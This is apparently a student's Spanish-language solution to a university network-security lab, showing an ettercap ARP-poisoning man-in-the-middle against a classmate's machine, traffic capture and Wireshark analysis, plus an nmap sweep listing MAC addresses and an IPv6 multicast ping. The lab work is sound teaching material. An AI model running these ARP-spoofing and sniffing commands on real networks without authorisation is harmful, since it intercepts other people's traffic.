# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL (SOLUCIÓN)

En esta segunda parte se muestran las soluciones a la primera práctica. En [`p2-sesiones`](./p2-sesiones.md) se mostrarán los apuntes tomados durante las sesiones.

## EJERCICIOS

### Apartado A

Instale el ettercap y pruebe sus opciones básicas en línea de comando.

```
apt install ettercap-text-only
```

### Apartado B

Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería  (puede utilizar el wireshark para los siguientes subapartados).

1. Hacemos un MITM a la máquina de nuestro compañero:

```bash
root@debian:/home/lsi/ossec-hids-3.7.0# ettercap -T -q -i ens33 -M arp:remote //10.11.49.106/ //10.11.48.1/

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
 ens33 -> 00:50:56:97:D5:D9
	  10.11.48.50/255.255.254.0
	  fe80::250:56ff:fe97:d5d9/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 10.11.49.106 00:50:56:97:24:D0

 GROUP 2 : 10.11.48.1 DC:08:56:10:84:B9
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help
```

2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero `compa.pcap`:

```bash
root@debian:/home/lsi# tcpdump -i ens33 -s 65535 -w compa.pcap
tcpdump: listening on ens33, link-type EN10MB (Ethernet), snapshot length 65535 bytes
^C1250 packets captured
1254 packets received by filter
0 packets dropped by kernel
```

3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero `compa.pcap`:

```zsh
╭─alvarofreire at alvaro-msi in ~ 22-11-03 - 12:44:17
╰─○ scp lsi@10.11.48.50:/home/lsi/compa.pcap .
lsi@10.11.48.50's password: 
compa.pcap                                    100%  748KB 401.7KB/s   00:01
```

4. Ejecutamos Wireshark y abrimos el archivo `compa.pcap` para comenzar a analizar.

- Identifique los campos de cabecera de un paquete TCP.

Copiado del wireshark:

```
Frame 59: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
Ethernet II, Src: VMware_97:24:d0 (00:50:56:97:24:d0), Dst: VMware_97:d5:d9 (00:50:56:97:d5:d9)
Internet Protocol Version 4, Src: 10.11.49.106, Dst: 188.164.193.158
Transmission Control Protocol, Src Port: 49006, Dst Port: 80, Seq: 1, Ack: 1, Len: 111
    Source Port: 49006
    Destination Port: 80
    [Stream index: 5]
    [Conversation completeness: Complete, WITH_DATA (31)]
    [TCP Segment Len: 111]
    Sequence Number: 1    (relative sequence number)
    Sequence Number (raw): 275151347
    [Next Sequence Number: 112    (relative sequence number)]
    Acknowledgment Number: 1    (relative ack number)
    Acknowledgment number (raw): 4018007217
    0101 .... = Header Length: 20 bytes (5)
    Flags: 0x018 (PSH, ACK)
    Window: 502
    [Calculated window size: 64256]
    [Window size scaling factor: 128]
    Checksum: 0x8766 [unverified]
    [Checksum Status: Unverified]
    Urgent Pointer: 0
    [Timestamps]
    [SEQ/ACK analysis]
    TCP payload (111 bytes)
Hypertext Transfer Protocol

```

- Filtre la captura para obtener el tráfico HTTP.

Escribo "http" en la barra de filtrado:

```
59	21.912751	10.11.49.106	188.164.193.158	HTTP	165	GET /documentos/internet_tegn.htm HTTP/1.1 
197	22.051898	188.164.193.158	10.11.49.106	HTTP	1163	HTTP/1.1 200 OK  (text/html)
383	22.698617	10.11.49.72	10.11.48.50	HTTP	84	GET / HTTP/1.0 
399	22.795106	10.11.48.50	10.11.49.72	HTTP	992	HTTP/1.1 200 OK  (text/html)
665	32.672654	193.147.147.81	10.11.49.106	HTTP	547	HTTP/1.1 200 OK  (text/html)
899	49.056718	10.11.49.106	188.164.193.158	HTTP	165	GET /documentos/internet_tegn.htm HTTP/1.1 
1047	49.192641	188.164.193.158	10.11.49.106	HTTP	1163	HTTP/1.1 200 OK  (text/html)
```

- Obtenga los distintos "objetos" del tráfico HTTP (imágenes, pdfs, etc.)

```
59	21.912751	10.11.49.106	188.164.193.158	HTTP	165	GET /documentos/internet_tegn.htm HTTP/1.1 
383	22.698617	10.11.49.72	10.11.48.50	HTTP	84	GET / HTTP/1.0 
899	49.056718	10.11.49.106	188.164.193.158	HTTP	165	GET /documentos/internet_tegn.htm HTTP/1.1 
```

- Visualice la paquetería TCP de una determinada sesión.

Analyze > Follow > TCP Stream

```
GET /documentos/internet_tegn.htm HTTP/1.1
Host: www.hipertexto.info
User-Agent: curl/7.74.0
Accept: */*

HTTP/1.1 200 OK
Date: Thu, 03 Nov 2022 11:43:52 GMT
Server: Apache
Last-Modified: Sun, 29 Jul 2018 14:08:54 GMT
ETag: "71667c-ed1b-57223e297ba09"
Accept-Ranges: bytes
Content-Length: 60699
Vary: Accept-Encoding
X-Powered-By: PleskLin
Content-Type: text/html

<html xmlns:mso="urn:schemas-microsoft-com:office:office" xmlns:msdt="uuid:C2F41010-65B3-11d1-A29F-00AA00C14882">

<head>
<!--[if gte mso 9]><xml>
<mso:CustomDocumentProperties>
<mso:Categories

...
```

- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico sobre el tráfico.

Statistics > Protocol Hierarchy

```csv
"Protocol", "Percent Packets", "Packets", "Percent Bytes", "Bytes", "Bits/s", "End Packets", "End Bytes", "End Bits/s"
"Frame",     100,               158,       100,             130960,  4.237k,   0,             0,           0
"Ethernet",  100,               158,       1.7,             2212,    71k,      0,             0,           0
"IPv4",      100,               158,       2.4,             3160,    102k,     0,             0,           0
"TCP",       100,               158,       95.7,            125384,  4.056k,   147,           110804,      3.585k
"Malformed Packet",     5.7,    9,         0,               0,       0,        9,             0,           0
"HTTP",      1.3,               2,         46.6,            61080,   1.976k,   1,             111,         3.591k
"Line-based text data", 0.6,    1,         46.3,            60699,   1.964k,   1,             60969,       1.972k
```

- Obtenga información del tráfico de las distintas "conversaciones" mantenidas.

Statistics > Conversations

- Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.

Statistics > Endpoints

### Apartado C

Obtenga la relación de las direcciones MAC de los equipos de su segmento.

```bash
root@debian:/home/lsi# nmap -sP 10.11.48.0/23
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-30 17:12 CET
Nmap scan report for 10.11.48.1
Host is up (0.00061s latency).
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Nmap scan report for 10.11.48.2
Host is up (0.00063s latency).
MAC Address: 00:50:56:97:B5:D6 (VMware)
Nmap scan report for 10.11.48.3
Host is up (0.00038s latency).
MAC Address: 00:50:56:97:2C:BF (VMware)
Nmap scan report for 10.11.48.16
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:2C:AD (VMware)
Nmap scan report for 10.11.48.17
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:52:AF (VMware)
Nmap scan report for 10.11.48.18
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:54:17 (VMware)
Nmap scan report for 10.11.48.20
Host is up (0.00073s latency).
MAC Address: 00:50:56:97:03:43 (VMware)
Nmap scan report for 10.11.48.22
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:5A:A5 (VMware)
Nmap scan report for 10.11.48.24
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:6B:A6 (VMware)
Nmap scan report for 10.11.48.25
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:11:58 (VMware)
Nmap scan report for 10.11.48.26
Host is up (0.00083s latency).
MAC Address: 00:50:56:97:11:BC (VMware)
Nmap scan report for 10.11.48.27
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:0C:15 (VMware)
Nmap scan report for 10.11.48.28
Host is up (0.0015s latency).
MAC Address: 00:50:56:97:B2:FD (VMware)
Nmap scan report for 10.11.48.29
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:4D:3D (VMware)
Nmap scan report for 10.11.48.30
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:48:08 (VMware)
Nmap scan report for 10.11.48.31
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:59:93 (VMware)
Nmap scan report for 10.11.48.32
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:38:A4 (VMware)
Nmap scan report for 10.11.48.41
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:E7:F9 (VMware)
Nmap scan report for 10.11.48.42
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:C2:B1 (VMware)
Nmap scan report for 10.11.48.43
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:34:99 (VMware)
Nmap scan report for 10.11.48.44
Host is up (0.00098s latency).
MAC Address: 00:50:56:97:D1:5B (VMware)
Nmap scan report for 10.11.48.45
Host is up (0.00043s latency).
MAC Address: 00:50:56:97:20:05 (VMware)
Nmap scan report for 10.11.48.46
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:6D:78 (VMware)
Nmap scan report for 10.11.48.47
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:FD:C8 (VMware)
Nmap scan report for 10.11.48.48
Host is up (0.0016s latency).
MAC Address: 00:50:56:97:A0:4A (VMware)
Nmap scan report for 10.11.48.49
Host is up (0.00030s latency).
MAC Address: 00:50:56:97:3D:5B (VMware)
Nmap scan report for 10.11.48.51
Host is up (0.0053s latency).
MAC Address: 00:50:56:97:B1:0B (VMware)
Nmap scan report for 10.11.48.52
Host is up (0.00031s latency).
MAC Address: 00:50:56:97:4D:09 (VMware)
Nmap scan report for 10.11.48.67
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:45:DD (VMware)
Nmap scan report for 10.11.48.68
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:3B:3B (VMware)
Nmap scan report for 10.11.48.69
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:35:B3 (VMware)
Nmap scan report for 10.11.48.70
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:6D:5C (VMware)
Nmap scan report for 10.11.48.71
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:0B:5A (VMware)
Nmap scan report for 10.11.48.72
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:2D:42 (VMware)
Nmap scan report for 10.11.48.73
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:A1:04 (VMware)
Nmap scan report for 10.11.48.74
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:94:AB (VMware)
Nmap scan report for 10.11.48.75
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:4D:2F (VMware)
Nmap scan report for 10.11.48.76
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:71:72 (VMware)
Nmap scan report for 10.11.48.77
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:77:5B (VMware)
Nmap scan report for 10.11.48.78
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:2C:99 (VMware)
Nmap scan report for 10.11.48.91
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:98:7C (VMware)
Nmap scan report for 10.11.48.92
Host is up (0.0025s latency).
MAC Address: 00:50:56:97:2A:56 (VMware)
Nmap scan report for 10.11.48.93
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:66:92 (VMware)
Nmap scan report for 10.11.48.94
Host is up (0.00031s latency).
MAC Address: 00:50:56:97:60:D0 (VMware)
Nmap scan report for 10.11.48.95
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:FF:B9 (VMware)
Nmap scan report for 10.11.48.97
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:25:61 (VMware)
Nmap scan report for 10.11.48.98
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:53:DD (VMware)
Nmap scan report for 10.11.48.99
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:70:AC (VMware)
Nmap scan report for 10.11.48.100
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:A0:D5 (VMware)
Nmap scan report for 10.11.48.101
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:EE:5B (VMware)
Nmap scan report for 10.11.48.102
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:03:80 (VMware)
Nmap scan report for 10.11.48.114
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:80:9B (VMware)
Nmap scan report for 10.11.48.115
Host is up (0.00081s latency).
MAC Address: 00:50:56:97:F8:13 (VMware)
Nmap scan report for 10.11.48.116
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:C2:E4 (VMware)
Nmap scan report for 10.11.48.117
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:09:AC (VMware)
Nmap scan report for 10.11.48.118
Host is up (0.00045s latency).
MAC Address: 00:50:56:97:4E:A5 (VMware)
Nmap scan report for 10.11.48.119
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:E2:F6 (VMware)
Nmap scan report for 10.11.48.121
Host is up (0.00099s latency).
MAC Address: 00:50:56:97:2F:8C (VMware)
Nmap scan report for 10.11.48.122
Host is up (0.00076s latency).
MAC Address: 00:50:56:97:7B:AB (VMware)
Nmap scan report for 10.11.48.123
Host is up (0.0036s latency).
MAC Address: 00:50:56:97:51:C9 (VMware)
Nmap scan report for 10.11.48.124
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:D0:47 (VMware)
Nmap scan report for 10.11.48.125
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:30:26 (VMware)
Nmap scan report for 10.11.48.126
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:33:EA (VMware)
Nmap scan report for 10.11.48.127
Host is up (0.00036s latency).
MAC Address: 00:50:56:97:25:9F (VMware)
Nmap scan report for 10.11.48.128
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:3B:D6 (VMware)
Nmap scan report for 10.11.48.129
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:24:93 (VMware)
Nmap scan report for 10.11.48.141
Host is up (0.00065s latency).
MAC Address: 00:50:56:97:80:7F (VMware)
Nmap scan report for 10.11.48.142
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:D1:1D (VMware)
Nmap scan report for 10.11.48.143
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:62:B2 (VMware)
Nmap scan report for 10.11.48.144
Host is up (0.0016s latency).
MAC Address: 00:50:56:97:6B:BB (VMware)
Nmap scan report for 10.11.48.146
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:CD:AB (VMware)
Nmap scan report for 10.11.48.147
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:29:3A (VMware)
Nmap scan report for 10.11.48.148
Host is up (0.00055s latency).
MAC Address: 00:50:56:97:0B:13 (VMware)
Nmap scan report for 10.11.48.149
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:11:4A (VMware)
Nmap scan report for 10.11.48.150
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:BE:4B (VMware)
Nmap scan report for 10.11.48.151
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:D1:A4 (VMware)
Nmap scan report for 10.11.48.152
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:AA:04 (VMware)
Nmap scan report for 10.11.48.153
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:31:FD (VMware)
Nmap scan report for 10.11.48.155
Host is up (0.00099s latency).
MAC Address: 00:50:56:97:F3:E5 (VMware)
Nmap scan report for 10.11.48.156
Host is up (0.00095s latency).
MAC Address: 00:50:56:97:6A:6A (VMware)
Nmap scan report for 10.11.48.165
Host is up (0.00047s latency).
MAC Address: 00:50:56:97:95:FF (VMware)
Nmap scan report for 10.11.48.166
Host is up (0.00045s latency).
MAC Address: 00:50:56:97:29:F0 (VMware)
Nmap scan report for 10.11.48.167
Host is up (0.00055s latency).
MAC Address: 00:50:56:97:B2:0E (VMware)
Nmap scan report for 10.11.48.168
Host is up (0.00052s latency).
MAC Address: 00:50:56:97:BB:A5 (VMware)
Nmap scan report for 10.11.48.170
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:D6:7E (VMware)
Nmap scan report for 10.11.48.171
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:F7:4F (VMware)
Nmap scan report for 10.11.48.172
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:89:C5 (VMware)
Nmap scan report for 10.11.48.173
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:0A:6A (VMware)
Nmap scan report for 10.11.48.174
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:5F:22 (VMware)
Nmap scan report for 10.11.48.189
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:27:98 (VMware)
Nmap scan report for 10.11.48.190
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:09:B6 (VMware)
Nmap scan report for 10.11.49.16
Host is up (0.00082s latency).
MAC Address: 00:50:56:97:03:8F (VMware)
Nmap scan report for 10.11.49.17
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:F6:06 (VMware)
Nmap scan report for 10.11.49.18
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:EE:84 (VMware)
Nmap scan report for 10.11.49.19
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:AC:5E (VMware)
Nmap scan report for 10.11.49.20
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:A3:7C (VMware)
Nmap scan report for 10.11.49.21
Host is up (0.00077s latency).
MAC Address: 00:50:56:97:52:62 (VMware)
Nmap scan report for 10.11.49.22
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:58:46 (VMware)
Nmap scan report for 10.11.49.23
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:00:22 (VMware)
Nmap scan report for 10.11.49.24
Host is up (0.00046s latency).
MAC Address: 00:50:56:97:32:D5 (VMware)
Nmap scan report for 10.11.49.25
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:D0:A2 (VMware)
Nmap scan report for 10.11.49.26
Host is up (0.00044s latency).
MAC Address: 00:50:56:97:88:37 (VMware)
Nmap scan report for 10.11.49.27
Host is up (0.00035s latency).
MAC Address: 00:50:56:97:C4:BA (VMware)
Nmap scan report for 10.11.49.28
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:5B:23 (VMware)
Nmap scan report for 10.11.49.29
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:32:71 (VMware)
Nmap scan report for 10.11.49.30
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:66:05 (VMware)
Nmap scan report for 10.11.49.41
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:FA:F7 (VMware)
Nmap scan report for 10.11.49.42
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:1B:89 (VMware)
Nmap scan report for 10.11.49.44
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:29:F2 (VMware)
Nmap scan report for 10.11.49.45
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:B0:96 (VMware)
Nmap scan report for 10.11.49.46
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:B9:F7 (VMware)
Nmap scan report for 10.11.49.47
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:49:65 (VMware)
Nmap scan report for 10.11.49.48
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:98:1B (VMware)
Nmap scan report for 10.11.49.49
Host is up (0.00035s latency).
MAC Address: 00:50:56:97:3E:F2 (VMware)
Nmap scan report for 10.11.49.50
Host is up (0.00072s latency).
MAC Address: 00:50:56:97:D1:E1 (VMware)
Nmap scan report for 10.11.49.51
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:0C:41 (VMware)
Nmap scan report for 10.11.49.52
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:E9:89 (VMware)
Nmap scan report for 10.11.49.53
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:53:D9 (VMware)
Nmap scan report for 10.11.49.55
Host is up (0.00032s latency).
MAC Address: 00:50:56:97:8C:07 (VMware)
Nmap scan report for 10.11.49.56
Host is up (0.00038s latency).
MAC Address: 00:50:56:97:BA:37 (VMware)
Nmap scan report for 10.11.49.57
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:81:49 (VMware)
Nmap scan report for 10.11.49.58
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:65:D7 (VMware)
Nmap scan report for 10.11.49.66
Host is up (0.0030s latency).
MAC Address: 00:50:56:97:FF:AC (VMware)
Nmap scan report for 10.11.49.67
Host is up (0.00071s latency).
MAC Address: 00:50:56:97:CE:93 (VMware)
Nmap scan report for 10.11.49.68
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:91:B6 (VMware)
Nmap scan report for 10.11.49.69
Host is up (0.00084s latency).
MAC Address: 00:50:56:97:2D:96 (VMware)
Nmap scan report for 10.11.49.70
Host is up (0.00073s latency).
MAC Address: 00:50:56:97:34:0F (VMware)
Nmap scan report for 10.11.49.71
Host is up (0.00080s latency).
MAC Address: 00:50:56:97:16:9C (VMware)
Nmap scan report for 10.11.49.72
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:2B:61 (VMware)
Nmap scan report for 10.11.49.73
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:95:15 (VMware)
Nmap scan report for 10.11.49.74
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:06:3A (VMware)
Nmap scan report for 10.11.49.75
Host is up (0.00032s latency).
MAC Address: 00:50:56:97:E5:34 (VMware)
Nmap scan report for 10.11.49.76
Host is up (0.0041s latency).
MAC Address: 00:50:56:97:C3:7A (VMware)
Nmap scan report for 10.11.49.77
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:2A:D7 (VMware)
Nmap scan report for 10.11.49.78
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:2A:5E (VMware)
Nmap scan report for 10.11.49.91
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:7F:95 (VMware)
Nmap scan report for 10.11.49.92
Host is up (0.00065s latency).
MAC Address: 00:50:56:97:FD:2C (VMware)
Nmap scan report for 10.11.49.95
Host is up (0.00074s latency).
MAC Address: 00:50:56:97:B5:D6 (VMware)
Nmap scan report for 10.11.49.96
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:2C:BF (VMware)
Nmap scan report for 10.11.49.97
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:6A:E0 (VMware)
Nmap scan report for 10.11.49.98
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:49:66 (VMware)
Nmap scan report for 10.11.49.99
Host is up (0.00040s latency).
MAC Address: 00:50:56:97:14:32 (VMware)
Nmap scan report for 10.11.49.100
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:C2:2E (VMware)
Nmap scan report for 10.11.49.101
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:52:36 (VMware)
Nmap scan report for 10.11.49.102
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:84:15 (VMware)
Nmap scan report for 10.11.49.103
Host is up (0.00070s latency).
MAC Address: 00:50:56:97:6E:46 (VMware)
Nmap scan report for 10.11.49.104
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:B6:4A (VMware)
Nmap scan report for 10.11.49.105
Host is up (0.00075s latency).
MAC Address: 00:50:56:97:F2:13 (VMware)
Nmap scan report for 10.11.49.106
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:24:D0 (VMware)
Nmap scan report for 10.11.49.116
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:FB:05 (VMware)
Nmap scan report for 10.11.49.117
Host is up (0.00078s latency).
MAC Address: 00:50:56:97:BA:BB (VMware)
Nmap scan report for 10.11.49.118
Host is up (0.00096s latency).
MAC Address: 00:50:56:97:8C:DC (VMware)
Nmap scan report for 10.11.49.119
Host is up (0.00064s latency).
MAC Address: 00:50:56:97:71:B2 (VMware)
Nmap scan report for 10.11.49.120
Host is up (0.00034s latency).
MAC Address: 00:50:56:97:A3:5F (VMware)
Nmap scan report for 10.11.49.121
Host is up (0.0010s latency).
MAC Address: 00:50:56:97:0C:1B (VMware)
Nmap scan report for 10.11.49.123
Host is up (0.00069s latency).
MAC Address: 00:50:56:97:15:62 (VMware)
Nmap scan report for 10.11.49.124
Host is up (0.00068s latency).
MAC Address: 00:50:56:97:86:AA (VMware)
Nmap scan report for 10.11.49.125
Host is up (0.0018s latency).
MAC Address: 00:50:56:97:68:EA (VMware)
Nmap scan report for 10.11.49.126
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:97:C0 (VMware)
Nmap scan report for 10.11.49.127
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:1A:26 (VMware)
Nmap scan report for 10.11.49.128
Host is up (0.00033s latency).
MAC Address: 00:50:56:97:1D:FD (VMware)
Nmap scan report for 10.11.49.129
Host is up (0.00059s latency).
MAC Address: 00:50:56:97:AF:A5 (VMware)
Nmap scan report for 10.11.49.130
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:55:5E (VMware)
Nmap scan report for 10.11.49.141
Host is up (0.00060s latency).
MAC Address: 00:50:56:97:B0:55 (VMware)
Nmap scan report for 10.11.49.142
Host is up (0.00057s latency).
MAC Address: 00:50:56:97:94:82 (VMware)
Nmap scan report for 10.11.49.143
Host is up (0.00067s latency).
MAC Address: 00:50:56:97:4E:86 (VMware)
Nmap scan report for 10.11.49.144
Host is up (0.00066s latency).
MAC Address: 00:50:56:97:0E:8A (VMware)
Nmap scan report for 10.11.49.145
Host is up (0.0013s latency).
MAC Address: 00:50:56:97:1B:0E (VMware)
Nmap scan report for 10.11.49.146
Host is up (0.00058s latency).
MAC Address: 00:50:56:97:DE:D1 (VMware)
Nmap scan report for 10.11.49.147
Host is up (0.00063s latency).
MAC Address: 00:50:56:97:FE:B6 (VMware)
Nmap scan report for 10.11.49.148
Host is up (0.00061s latency).
MAC Address: 00:50:56:97:FB:C9 (VMware)
Nmap scan report for 10.11.49.149
Host is up (0.00056s latency).
MAC Address: 00:50:56:97:6B:35 (VMware)
Nmap scan report for 10.11.49.150
Host is up (0.0012s latency).
MAC Address: 00:50:56:97:FC:95 (VMware)
Nmap scan report for 10.11.49.151
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:41:A8 (VMware)
Nmap scan report for 10.11.49.152
Host is up (0.0014s latency).
MAC Address: 00:50:56:97:2C:14 (VMware)
Nmap scan report for 10.11.49.153
Host is up (0.00054s latency).
MAC Address: 00:50:56:97:3A:4A (VMware)
Nmap scan report for 10.11.49.154
Host is up (0.0011s latency).
MAC Address: 00:50:56:97:AC:D0 (VMware)
Nmap scan report for 10.11.49.165
Host is up (0.00053s latency).
MAC Address: 00:50:56:97:BD:3F (VMware)
Nmap scan report for debian (10.11.48.50)
Host is up.
Nmap done: 512 IP addresses (179 hosts up) scanned in 6.81 seconds
```

### Apartado D

Obtenga la relación de las direcciones IPv6 de su segmento.

```bash
root@debian:/home/lsi# ping6 -c2 -I ens33 ff02::1
ping6: Warning: source address might be selected on device other than: ens33
PING ff02::1(ff02::1) from :: ens33: 56 data bytes
64 bytes from fe80::250:56ff:fe97:d5d9%ens33: icmp_seq=1 ttl=64 time=0.101 ms
64 bytes from fe80::250:56ff:fe97:a35f%ens33: icmp_seq=1 ttl=64 time=0.639 ms
64 bytes from fe80::250:56ff:fe97:1dfd%ens33: icmp_seq=1 ttl=64 time=0.650 ms
64 bytes from fe80::250:56ff:fe97:809b%ens33: icmp_seq=1 ttl=64 time=0.847 ms
64 bytes from fe80::250:56ff:fe97:ffac%ens33: icmp_seq=1 ttl=64 time=0.896 ms
64 bytes from fe80::250:56ff:fe97:94ab%ens33: icmp_seq=1 ttl=64 time=1.03 ms
64 bytes from fe80::250:56ff:fe97:5aa5%ens33: icmp_seq=1 ttl=64 time=1.32 ms
64 bytes from fe80::250:56ff:fe97:60d0%ens33: icmp_seq=1 ttl=64 time=1.33 ms
64 bytes from fe80::250:56ff:fe97:3026%ens33: icmp_seq=1 ttl=64 time=1.42 ms
64 bytes from fe80::250:56ff:fe97:a6a%ens33: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from fe80::250:56ff:fe97:52af%ens33: icmp_seq=1 ttl=64 time=1.44 ms
64 bytes from fe80::250:56ff:fe97:91b6%ens33: icmp_seq=1 ttl=64 time=1.44 ms
64 bytes from fe80::250:56ff:fe97:70ac%ens33: icmp_seq=1 ttl=64 time=1.53 ms
64 bytes from fe80::250:56ff:fe97:3499%ens33: icmp_seq=1 ttl=64 time=1.53 ms
64 bytes from fe80::250:56ff:fe97:2c99%ens33: icmp_seq=1 ttl=64 time=1.55 ms
64 bytes from fe80::250:56ff:fe97:7172%ens33: icmp_seq=1 ttl=64 time=1.56 ms
64 bytes from fe80::250:56ff:fe97:95ff%ens33: icmp_seq=1 ttl=64 time=1.57 ms
64 bytes from fe80::250:56ff:fe97:41a8%ens33: icmp_seq=1 ttl=64 time=1.61 ms
64 bytes from fe80::250:56ff:fe97:5846%ens33: icmp_seq=1 ttl=64 time=1.61 ms
64 bytes from fe80::250:56ff:fe97:2005%ens33: icmp_seq=1 ttl=64 time=1.62 ms
64 bytes from fe80::250:56ff:fe97:63a%ens33: icmp_seq=1 ttl=64 time=1.62 ms
64 bytes from fe80::250:56ff:fe97:2d96%ens33: icmp_seq=1 ttl=64 time=1.74 ms
64 bytes from fe80::250:56ff:fe97:fbc9%ens33: icmp_seq=1 ttl=64 time=1.74 ms
64 bytes from fe80::250:56ff:fe97:babb%ens33: icmp_seq=1 ttl=64 time=1.75 ms
64 bytes from fe80::250:56ff:fe97:169c%ens33: icmp_seq=1 ttl=64 time=1.79 ms
64 bytes from fe80::250:56ff:fe97:31fd%ens33: icmp_seq=1 ttl=64 time=1.80 ms
